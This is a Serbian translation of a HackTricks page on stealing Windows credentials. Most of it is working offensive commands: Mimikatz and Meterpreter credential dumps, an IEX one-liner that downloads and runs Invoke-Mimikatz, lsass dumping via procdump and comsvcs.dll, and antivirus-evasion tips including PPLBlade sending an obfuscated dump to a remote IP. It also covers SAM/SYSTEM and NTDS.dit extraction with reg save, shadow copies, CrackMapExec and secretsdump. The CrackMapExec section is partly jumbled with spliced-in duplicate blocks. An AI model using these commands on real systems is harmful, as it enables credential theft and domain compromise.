# Krađa Windows Kredencijala

<details>

<summary><strong>Naučite AWS hakovanje od početnika do eksperta sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks** ili **preuzmete HackTricks u PDF formatu** pogledajte [**PRETPLATNIČKE PLANOVE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kredencijali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o mogućim zaštitama za akreditive ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditive sa Meterpreter-om

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **tražite lozinke i hash-eve** unutar žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV-a

### Procdump + Mimikatz

Kako je **Procdump iz** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **legitiman Microsoft alat**, Defender ga ne detektuje.\
Možete koristiti ovaj alat da **izvršite dump lsass procesa**, **preuzmete dump** i **izvučete** **poverljive podatke lokalno** iz dump-a.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** **proslediti** kao **argument** **PID** lsass.exe procdump-u **umesto** imena lsass.exe.

### Dumping lsass sa **comsvcs.dll**

DLL pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` je odgovoran za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL uključuje **funkciju** pod nazivom **`MiniDumpW`**, koja je dizajnirana da se poziva pomoću `rundll32.exe`.\
Nije bitno koristiti prva dva argumenta, ali treći je podeljen na tri komponente. Prva komponenta je ID procesa koji se dump-uje, druga komponenta je lokacija dump fajla, a treća komponenta je striktno reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ove tri komponente, DLL se angažuje u kreiranju dump fajla i prebacivanju memorije specificiranog procesa u ovaj fajl.\
Korišćenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, čime se eliminiše potreba za upload-om i izvršavanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Sledeća komanda se koristi za izvršenje:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces sa** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass sa Task Manager-om**

1. Desni klik na Task Bar i kliknite na Task Manager
2. Kliknite na More details
3. Pretražite proces "Local Security Authority Process" u tabu Processes
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumpovanje lsass sa procdump-om

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite-a.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) је алат за заштићено процесно дамповање који подржава обфускацију меморијског дампа и пренос на удаљене радне станице без записивања на диск.

**Кључне функционалности**:

1. Заобилажење PPL заштите
2. Обфускација меморијских дамп фајлова ради избегавања Defender механизама детекције заснованих на потписима
3. Отпремање меморијског дампа са RAW и SMB методама отпремања без записивања на диск (дамп без фајлова)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

### Korišćenje mimikatz

```shell
mimikatz # sekurlsa::logonpasswords
```

### Korišćenje procdump

```shell
procdump -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Korišćenje comsvcs

```shell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 C:\Windows\Temp\lsass.dmp full
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Korišćenje Task Manager

1. Otvorite Task Manager
2. Desni klik na `lsass.exe` proces
3. Kliknite na `Create dump file`
4. Kopirajte .dmp fajl na sistem sa mimikatz
5. Učitajte .dmp fajl u mimikatz

```shell
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Korišćenje Process Explorer

1. Otvorite Process Explorer
2. Desni klik na `lsass.exe` proces
3. Kliknite na `Create Dump` > `Create Full Dump`
4. Kopirajte .dmp fajl na sistem sa mimikatz
5. Učitajte .dmp fajl u mimikatz

```shell
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Izdvajanje NTDS.dit sa ciljanog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izdvajanje NTDS.dit istorije lozinki sa ciljanog DC-a
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Krađa SAM & SYSTEM

Ovi fajlovi bi trebalo da budu **locirani** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićeni.

### Iz Registra

Najlakši način da ukradete ove fajlove je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na vašu Kali mašinu i **izvucite hash-eve** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete izvršiti kopiranje zaštićenih fajlova koristeći ovu uslugu. Morate biti Administrator.

#### Korišćenje vssadmin

vssadmin binarni fajl je dostupan samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali možete isto uraditi iz **Powershell**-a. Ovo je primer **kako kopirati SAM fajl** (korišćeni hard disk je "C:" i fajl je sačuvan u C:\users\Public) ali možete koristiti ovo za kopiranje bilo kog zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Datoteka **NTDS.dit** je poznata kao srce **Active Directory**, koja sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. Tu se čuvaju **hashovi lozinki** za domenske korisnike. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

Unutar ove baze podataka, održavaju se tri glavne tabele:

- **Data Table**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: **Sigurnosni deskriptori** za svaki objekat se čuvaju ovde, osiguravajući sigurnost i kontrolu pristupa za pohranjene objekte.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom i koristi ga _lsass.exe_. Zatim, **deo** datoteke **NTDS.dit** može biti lociran **unutar memorije `lsass`** (možete pronaći najnovije pristupane podatke verovatno zbog poboljšanja performansi korišćenjem **keša**).

#### Dešifrovanje hashova unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dešifrujte ključ za šifrovanje lozinke (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dešifrujte **hash** koristeći **PEK** i **RC4**.
3. Dešifrujte **hash** koristeći **DES**.

**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM datoteke kontrolera domena (razlikuje se između kontrolera domena)**. Zbog toga, da biste dobili kredencijale iz NTDS.dit datoteke, **potrebne su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeći Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takođe možete koristiti trik sa [**volume shadow copy**](./#stealing-sam-and-system) da kopirate **ntds.dit** fajl. Zapamtite da će vam takođe trebati kopija **SYSTEM file** (opet, [**izvadite ga iz registra ili koristite volume shadow copy**](./#stealing-sam-and-system) trik).

### **Ekstrakcija hash-eva iz NTDS.dit**

Kada ste **dobavili** fajlove **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete hash-eve**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takođe možete **automatski ih izvući** koristeći validnog domen admin korisnika:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit fajlove** preporučuje se ekstrakcija koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain\_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija domen objekata iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu biti ekstrahovani u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se tajne ekstrahuju, već i čitavi objekti i njihovi atributi za dalju ekstrakciju informacija kada je sirovi NTDS.dit fajl već preuzet.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opcionalan, ali omogućava dešifrovanje tajni (NT & LM hash-evi, dopunske akreditive kao što su lozinke u čistom tekstu, kerberos ili trust ključevi, NT & LM istorije lozinki). Pored ostalih informacija, sledeći podaci se izvlače: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenska oznaka za poslednju prijavu i promenu lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, pouzdani domeni sa tipom poverenja, smerom i atributima...

## Lazagne

Preuzmite binarni fajl sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju akreditiva iz nekoliko softvera.
```
lazagne.exe all
```
## Ostali alati za ekstrakciju kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat može se koristiti za ekstrakciju kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Ekstrakcija kredencijala iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Ekstraktujte kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i samo ga **pokrenite** i lozinke će biti izvučene.

## Odbrane

[**Saznajte više o zaštiti kredencijala ovde.**](credentials-protections.md)

<details>

<summary><strong>Naučite AWS hakovanje od početnika do eksperta sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks** ili **preuzmete HackTricks u PDF formatu** pogledajte [**PRETPLATNE PLANOVE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
